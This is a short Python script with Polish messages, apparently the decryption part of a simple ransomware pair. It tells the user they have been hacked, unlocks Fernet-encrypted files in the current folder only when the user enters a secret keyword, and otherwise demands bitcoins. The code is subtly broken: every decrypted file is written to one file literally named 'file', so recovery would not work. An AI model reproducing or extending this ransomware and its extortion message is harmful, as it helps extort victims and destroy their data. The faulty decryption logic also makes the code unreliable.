# To robil F

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if (file == "decoding.py") or (file == "coding.py") or (file == "crypto_key.key"):
        continue
    if os.path.isfile(file):
        files.append(file)

key = ""
secret_phase = "katanga"

user_phase = str(input("[i] Zostales shakowany. Ha HA ha! Jestesmy na tyle mili, ze jak podasz slowo klucz, to odszyfrujemy te pliki."))

if user_phase == secret_phase:
    with open("crypto_key.key", "rb") as thekey:
        key = thekey.read()

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(key).decrypt(contents)
        with open("file", "wb") as thefile:
            thefile.write(contents_decrypted)
    print("[+] Pliki odszyfrowane. Nastepnym razem uwazaj!")
else:
    print("[-] Slowo klucz nie prawidlowe, prosze przeslac bitcoiny.")
